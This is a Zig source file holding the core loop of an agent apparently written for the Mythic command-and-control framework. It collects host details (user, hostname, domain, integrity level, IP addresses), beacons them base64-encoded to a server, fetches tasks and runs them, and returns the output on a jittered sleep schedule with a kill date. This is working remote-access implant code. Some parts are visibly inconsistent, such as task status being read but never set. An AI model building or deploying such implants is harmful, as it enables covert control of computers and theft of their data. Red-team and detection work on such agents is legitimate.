const std = @import("std");
const base64 = std.base64;
const types = @import("types.zig");
const commands = @import("commands.zig");
const network = @import("network.zig");
const utils = @import("utils.zig");
const config = @import("config.zig");

const print = std.debug.print;
const ArrayList = std.ArrayList;
const Allocator = std.mem.Allocator;
const json = std.json;
const time = std.time;

const AgentConfig = types.AgentConfig;
const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;
const TaskStatus = types.TaskStatus;
const CommandExecutor = commands.CommandExecutor;
const NetworkClient = network.NetworkClient;
const SystemInfo = utils.SystemInfo;
const CryptoUtils = utils.CryptoUtils;
const TimeUtils = utils.TimeUtils;

pub const MythicAgent = struct {
    const Self = @This();
    
    allocator: Allocator,
    config: AgentConfig,
    uuid: []const u8,
    session_id: []const u8,
    network_client: NetworkClient,
    command_executor: CommandExecutor,
    system_info: SystemInfo,
    crypto_utils: CryptoUtils,
    
    aes_key: [32]u8, //For future use watch this space
    payload_uuid: []const u8,
    
    tasks: ArrayList(MythicTask),
    pending_responses: ArrayList(MythicResponse),
    is_running: bool,
    last_checkin: i64,
    
    pub fn init(allocator: Allocator, agent_config: types.AgentConfig) !Self {
        var crypto_utils = CryptoUtils.init(allocator);
        
        const session_id = try crypto_utils.generateSessionId();//session_id might be useful later. Not implemented yet
        const aes_key = CryptoUtils.generateAESKey();
        
        return Self{
            .allocator = allocator,
            .config = agent_config,
            .uuid = config.uuid,
            .session_id = session_id,
            .network_client = NetworkClient.init(allocator, agent_config),
            .command_executor = CommandExecutor.init(allocator),
            .system_info = SystemInfo.init(allocator),
            .crypto_utils = crypto_utils,
            .aes_key = aes_key,
            .payload_uuid = config.payload_uuid,
            .tasks = ArrayList(MythicTask).init(allocator),
            .pending_responses = ArrayList(MythicResponse).init(allocator),
            .is_running = false,
            .last_checkin = 0,
        };
    }
    
    pub fn deinit(self: *Self) void {
        self.allocator.free(self.session_id);
        self.tasks.deinit();
        self.pending_responses.deinit();
        self.network_client.deinit();
    }
    
    pub fn run(self: *Self) !void {
        self.is_running = true;
        
        try self.checkin();
        
        while (self.is_running) {
            if (self.config.kill_date) |kill_date| {
                if (TimeUtils.isKillDateReached(kill_date)) {
                    break;
                }
            }
            
            self.getTasks() catch |err| {
                print("[!] Failed to get tasks: {}\n", .{err});
            };
            
            try self.processTasks();
            
            self.sendResponses() catch |err| {
                print("[!] Failed to send responses: {}\n", .{err});
            };
            
            self.sleep();
        }
        
    }
    
    fn checkin(self: *Self) !void {
        const user = try self.system_info.getCurrentUser();
        defer self.allocator.free(user);
        const host = try self.system_info.getHostname();
        defer self.allocator.free(host);
        const pid = try self.system_info.getPid();
        defer self.allocator.free(pid);
        const domain = try self.system_info.getDomain();
        defer self.allocator.free(domain);
        const integrity_level = try self.system_info.getIntegrityLevel();
        defer self.allocator.free(integrity_level);
        const external_ip = try self.system_info.getExternalIP();
        defer self.allocator.free(external_ip);
        const internal_ip = try self.system_info.getInternalIP();
        defer self.allocator.free(internal_ip);
        const process_name = try self.system_info.getProcessName();
        defer self.allocator.free(process_name);

        const checkin_data = .{
            .action = "checkin",
            .uuid = self.uuid,
            .user = user,
            .host = host,
            .pid = pid,
            .domain = domain,
            .integrity_level = integrity_level,
            .external_ip = external_ip,
            .ips = internal_ip,
            .process_name = process_name,
        };
        var json_buffer = std.ArrayList(u8).init(self.allocator);
        defer json_buffer.deinit();
        try json.stringify(checkin_data, .{}, json_buffer.writer());

        var combined = std.ArrayList(u8).init(self.allocator);
        defer combined.deinit();
        try combined.appendSlice(self.payload_uuid);
        try combined.appendSlice(json_buffer.items);
        
        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(response);


        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
            print("[ERROR] Invalid Base64 response\n", .{});
            return error.InvalidBase64;
        };
        const decoded_response = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_response);
        base64.standard.Decoder.decode(decoded_response, response) catch {
            print("[ERROR] Failed to decode Base64 response\n", .{});
            return error.InvalidBase64;
        };

        if (response.len < 36) {
            return error.InvalidResponse;
        }
        const json_response = decoded_response[36..];
        const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
            print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
            return err;
        };
        defer parsed.deinit();
        if (parsed.value.object.get("id")) |payload_uuid_value| {
            self.payload_uuid = try self.allocator.dupe(u8, payload_uuid_value.string);
        } else {
            return error.InvalidResponse;
        }

        self.last_checkin = TimeUtils.getCurrentTimestamp();
    }
    
    fn getTasks(self: *Self) !void {
        const get_tasking_data = .{
            .action = "get_tasking",
            .tasking_size = 1,
        };
        
        var json_buffer = std.ArrayList(u8).init(self.allocator);
        defer json_buffer.deinit();

        try json.stringify(get_tasking_data, .{}, json_buffer.writer());

        var combined = std.ArrayList(u8).init(self.allocator);
        defer combined.deinit();

        try combined.appendSlice(self.payload_uuid);
        try combined.appendSlice(json_buffer.items);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(response);
        

        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
            print("[ERROR] Invalid Base64 response\n", .{});
            return error.InvalidBase64;
        };
        const decoded_response = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_response);

        base64.standard.Decoder.decode(decoded_response, response) catch {
            print("[ERROR] Failed to decode Base64 response\n", .{});
            return error.InvalidBase64;
        };
        
        if (response.len < 36) {
            return error.InvalidResponse;
        }
        const Task = struct {
            id: []const u8,
            command: []const u8,
            timestamp: i64,
            parameters: json.Value,
        };
        const json_response = decoded_response[36..];
        
        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
            print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
            return err;
        };
        defer parsed.deinit();
    
        try self.parseTaskResponse(json_response);
    }
    
    fn parseTaskResponse(self: *Self, response: []const u8) !void {
        const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch return;
        defer parsed.deinit();
        
        if (parsed.value.object.get("tasks")) |tasks_value| {
            if (tasks_value.array.items.len > 0) {
                for (tasks_value.array.items) |task_value| {
                    const task_obj = task_value.object;
                    
                    const task = MythicTask{
                        .id = try self.allocator.dupe(u8, task_obj.get("id").?.string),
                        .command = try self.allocator.dupe(u8, task_obj.get("command").?.string),
                        .parameters = try self.allocator.dupe(u8, task_obj.get("parameters").?.string),
                        .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}), 
                    };
                    
                    try self.tasks.append(task);
                }
            }
        }
    }
    
    fn processTasks(self: *Self) !void {
        for (self.tasks.items) |*task| {
            if (task.status == .submitted) {
                task.status = .processing;
                
                if (std.mem.eql(u8, task.command, "exit")) {
                    self.is_running = false;
                    const exit_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = "Agent terminating...",
                        .completed = true,
                        .status = "completed",
                    };
                    try self.pending_responses.append(exit_response);
                    task.status = .completed;
                    continue;
                }
                
                const result = self.command_executor.executeTask(task.*) catch |err| {
                    const error_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = try std.fmt.allocPrint(self.allocator, "Error executing task: {}", .{err}),
                        .completed = true,
                        .status = "error",
                    };
                    try self.pending_responses.append(error_response);
                    task.status = .erroragent;
                    continue;
                };
                
                try self.pending_responses.append(result);
                task.status = .completed;
            }
        }
    }
    
    fn sendResponses(self: *Self) !void {
        if (self.pending_responses.items.len == 0) return;

        const ResponseObj = struct {
            task_id: []const u8,
            user_output: ?[]const u8 = null,
            completed: bool = true,
            status: []const u8,
        };

        var responses = std.ArrayList(ResponseObj).init(self.allocator);
        defer responses.deinit();

        for (self.pending_responses.items) |response| {
            try responses.append(ResponseObj{
                .task_id = response.task_id,
                .user_output = response.user_output,
                .completed = response.completed,
                .status = response.status,
            });
        }

        const response_data = .{
            .action = "post_response",
            .responses = responses.items,
        };

        var json_buffer = std.ArrayList(u8).init(self.allocator);
        defer json_buffer.deinit();
        try json.stringify(response_data, .{}, json_buffer.writer());

        var combined = std.ArrayList(u8).init(self.allocator);
        defer combined.deinit();
        try combined.appendSlice(self.payload_uuid);
        try combined.appendSlice(json_buffer.items);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const server_response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(server_response);

        self.pending_responses.clearAndFree();
    }

    fn sleep(self: *Self) void {
        const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
        TimeUtils.sleep(sleep_time);
    }
};
